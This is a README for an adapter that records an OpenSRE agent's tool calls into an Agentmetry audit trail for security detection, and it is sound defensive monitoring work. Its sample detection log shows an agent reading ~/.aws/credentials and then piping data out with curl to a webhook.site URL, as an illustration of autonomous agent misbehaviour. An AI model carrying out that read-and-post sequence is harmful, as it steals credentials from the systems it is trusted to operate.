# OpenSRE adapter

Record every tool an [OpenSRE](https://github.com/Tracer-Cloud/opensre) agent
executes into your local Agentmetry trail.

An SRE agent runs against live infrastructure during an incident, with real
credentials, usually unattended, usually at 3am. If you are going to give an
agent that access, you want a flight recorder on it.

## Install

Copy `agentmetry_opensre.py` next to your agent, or put this directory on your
`PYTHONPATH`. No dependencies beyond the standard library.

OpenSRE's `Agent` already accepts an `on_runtime_event` callback, so wiring is
one line:

```python
from agentmetry_opensre import AgentmetryRecorder

agent = Agent(
    llm=...,
    tools=[...],
    on_runtime_event=AgentmetryRecorder(),
)
```

Already using `on_runtime_event`? Chain it instead of replacing it:

```python
recorder = AgentmetryRecorder(chain_to=my_existing_callback)
```

## What it records

| OpenSRE event | Canonical event |
|---|---|
| `AgentStartEvent` | `session_start` (new `correlation_id` per run) |
| `ToolExecutionStartEvent` | `approval_request` (pending) |
| `ToolExecutionEndEvent` | `tool_called`, or `tool_failed` when `is_error` |
| `AgentEndEvent` | `session_end` |

Everything else in the `RuntimeEvent` union (turns, messages, provider requests)
is ignored: this records what the agent *did*, not what it said.

Each run is **one correlation id**, so sequence rules fire across a whole
incident-response run. Runs are marked `triggered_by: opensre`, so the engine
treats them as autonomous.

## Configuration

| Env | Default | Description |
|---|---|---|
| `AGENTMETRY_AUDIT_INGEST_URL` | `http://127.0.0.1:8000` | Where to send events |
| `AGENTMETRY_API_KEY` | *(unset)* | Sent as `X-API-Key` when set |
| `AGENTMETRY_OPENSRE_LOG_ARGS` | *(off)* | Send tool arguments, not just their hash |

**Arguments are hashed and not transmitted by default.** Turn
`AGENTMETRY_OPENSRE_LOG_ARGS=1` on to send them, which is what enables
content-based detection: a read of `~/.aws/credentials` upgrading to Credential
Access (T1552.001), a shell `curl` earning Command and Control (T1071.001), and
the DLP engine scanning for secrets. Secret-looking values are scrubbed either
way. Leave it off if the arguments themselves are sensitive; you keep the hash
and the sequence, you lose the content upgrades.

## What it catches

An incident-response run that goes somewhere it should not:

```
opensre.run_shell    T1059       Execution              kubectl get pods -n prod
opensre.read_file    T1552.001   Credential Access      ~/.aws/credentials
opensre.run_shell    T1071.001   Command and Control    curl -X POST https://webhook.site/... -d @-

*** [CRITICAL] credential-exfil
    opensre.read_file accessed credentials, then opensre.run_shell egressed
    to the network in the same session.
```

Note the third line: the egress is `curl` *inside* a shell command, and it still
earns TA0011. That matters, because shell-wrapped `curl` is the most common
exfil path there is.

## Failure behaviour

If Agentmetry is not running, the recorder prints one warning to stderr and the
agent continues. Any error inside the recorder is caught, and a chained callback
still runs. An audit sink that can crash the agent it observes, mid-incident, is
worse than no audit sink.

## Limits

- It sees the tools OpenSRE emits events for. Anything that bypasses the
  `RuntimeEvent` stream is not recorded.
- It is a recorder, not a sandbox. It does not block OpenSRE tool execution.
